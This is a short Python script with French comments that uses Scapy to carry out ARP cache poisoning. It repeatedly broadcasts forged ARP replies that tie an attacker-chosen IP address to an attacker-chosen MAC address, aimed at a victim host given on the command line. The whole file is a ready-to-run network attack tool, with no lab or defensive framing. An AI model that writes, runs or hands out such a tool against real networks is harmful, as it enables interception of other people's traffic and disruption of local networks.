from scapy.all import *
import sys
import time

def arp_poison(target_ip, fake_ip, fake_mac):
    # Créer un paquet ARP spoof
    arp_response = Ether(dst='ff:ff:ff:ff:ff:ff') / \
                   ARP(op=2, hwsrc=fake_mac, psrc=fake_ip, hwdst='00:00:00:00:00:00', pdst=target_ip)

    while True:
        # Envoyer le paquet ARP à la victime
        sendp(arp_response, verbose=False)
        print(f"Envoyé : {fake_ip} ({fake_mac}) vers {target_ip}")
        time.sleep(2)  # Attendre 2 secondes entre les envois

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python arp_poisoning.py <target_ip> <fake_ip> <fake_mac>")
        sys.exit(1)

    target_ip = sys.argv[1]  # Adresse IP de la victime
    fake_ip = sys.argv[2]    # Adresse IP à injecter
    fake_mac = sys.argv[3]   # Adresse MAC à injecter

    arp_poison(target_ip, fake_ip, fake_mac)

